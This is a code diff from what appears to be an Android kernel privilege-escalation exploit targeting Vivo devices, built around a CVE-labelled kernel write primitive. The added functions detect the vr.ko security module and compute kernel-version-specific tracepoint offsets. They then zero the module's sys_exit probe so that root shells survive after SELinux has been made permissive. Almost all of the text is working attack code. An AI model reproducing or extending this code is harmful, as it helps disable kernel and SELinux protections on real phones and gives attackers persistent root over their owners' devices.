@@ -34,6 +34,7 @@
 #include <string_view>
 #include <utility>
 
+
 namespace ghostlock::session::backend {
     namespace {
         /* Shared write/retry sequence. */
@@ -162,8 +163,7 @@ namespace ghostlock::session::backend {
          *     whole word. VERIFY ON-DEVICE that zeroing bytes 0x28-0x2f is
          *     safe on your 6.1.145 kernel; if not, comment out the tagB write.
          * ------------------------------------------------------------------ */
-            support::run_state::enter("w2b");
-            {
+                        support::run_state::enter("w2b");
                 static int32_t vr_needed = -1;
                 if (vr_needed < 0) {
                     vr_needed = 1; /* /proc/modules unreadable: assume loaded */
@@ -174,8 +174,6 @@ namespace ghostlock::session::backend {
                         vr_needed = 0;
                         while (fgets(mod.data(), static_cast<int32_t>(mod.size()), m)) {
                             const std::string_view line(mod.data());
-                            /* strncasecmp(mod, "vr", 2): a case-insensitive prefix,
-                             * then the module-name separator. */
                             const bool vr_prefix =
                                     line.size() >= 2 &&
                                     (line[0] == 'v' || line[0] == 'V') &&
@@ -213,7 +211,6 @@ namespace ghostlock::session::backend {
                         pr_warning("VR.ko tag clear failed; child may be killed during W2 verify\n");
                     }
                 }
-            }
             support::run_state::complete("w2b");
 
             support::run_state::enter("w2a");
@@ -377,6 +374,50 @@ namespace ghostlock::session::backend {
                 return false;
             }
         }
+        
+/* offsetof(struct tracepoint, funcs) for the running KMI. */
+        uint32_t tracepoint_funcs_off() {
+            const char *r = g_exploit_session.profile.release();
+            unsigned maj = 0, min = 0;
+            if (!r || sscanf(r, "%u.%u", &maj, &min) != 2) {
+                pr_warning("vr global: cannot parse KMI '%s'; assuming 6.1 layout\n",
+                           r ? r : "(null)");
+                return kernel::TRACEPOINT_FUNCS_OFF_6_1;
+            }
+            /* Boundary verified on 6.1 (0x48/0x40) and 6.6 (0x50/0x48) only; other
+             * KMIs are assumed to follow the same rule. */
+            if (maj > 6 || (maj == 6 && min >= 6)) return kernel::TRACEPOINT_FUNCS_OFF_6_6;
+            return kernel::TRACEPOINT_FUNCS_OFF_6_1;
+        }
+
+                        template <class M>
+        int32_t neutralize_vr_global(ExploitSession &session) {
+            uint64_t off_vr = profile::off_vr_sys_exit_tp();
+            if (!off_vr) {
+                pr_warning("vr global: vr.ko is loaded but off_vr_sys_exit_tp is unset; KSU shells will be killed\n");
+                return 0;
+            }
+            uint32_t funcs_off = tracepoint_funcs_off();
+            uintptr_t tp_funcs_addr = session.addresses.data_alias(kernel::KIMAGE_TEXT_BASE + off_vr) + funcs_off;
+            
+            pr_info("vr global: tp=%016zx funcs_off=0x%x -> zeroing @ %016zx\n",
+                    (size_t)session.addresses.data_alias(kernel::KIMAGE_TEXT_BASE + off_vr),
+                    funcs_off, tp_funcs_addr);
+
+            for (int32_t attempt = 1; attempt <= 5; attempt++) {
+                const memory::WriteRequest request = memory::WriteRequest::make(tp_funcs_addr, memory::WriteMode::Zero, 1);
+                Status ok = Cve2026_43499Policy::template attack_write<M>(session, request, "VR-global: sys_exit tp->funcs");
+                if (ok) {
+                    pr_success("vr.ko sys_exit probe neutralized (attempt %d)\n", attempt);
+                    return 1;
+                }
+                pr_warning("vr global: attempt %d failed, retrying\n", attempt);
+                usleep(50000);
+            }
+            pr_warning("vr global: all 5 attempts failed; KSU shells may be killed\n");
+            return 0;
+        }
+
 
         /* Stage: W1 SELinux plus the middleware-specific scratch / resident repair. */
         template <class M>
@@ -519,6 +560,30 @@ namespace ghostlock::session::backend {
             case StageResult::Continue:
                 break;
         }
+        
+        /* Vivo vr.ko: globally disable the sys_exit enforcement probe now that
+         * SELinux is permissive. Only runs if vr.ko is actively loaded in /proc/modules. */
+            int32_t vr_loaded = 0;
+            if (FILE *mf = fopen("/proc/modules", "r")) {
+                std::array<char, 256> mod{};
+                while (fgets(mod.data(), static_cast<int32_t>(mod.size()), mf)) {
+                    const std::string_view line(mod.data());
+                    if (line.size() >= 3 &&
+                        (line[0] == 'v' || line[0] == 'V') &&
+                        (line[1] == 'r' || line[1] == 'R') &&
+                        (line[2] == ' ' || line[2] == '_')) {
+                        vr_loaded = 1;
+                        break;
+                    }
+                }
+                fclose(mf);
+            }
+
+                        if (vr_loaded && profile::off_vr_sys_exit_tp()) {
+                neutralize_vr_global<M>(session);
+            } else if (vr_loaded) {
+                pr_warning("vr.ko is loaded but off_vr_sys_exit_tp offset is missing\n");
+            }
 
         /* W2+W3 as a retryable chain: a missed W3 write or probe can kill the
          * child, so respawn and redo. */
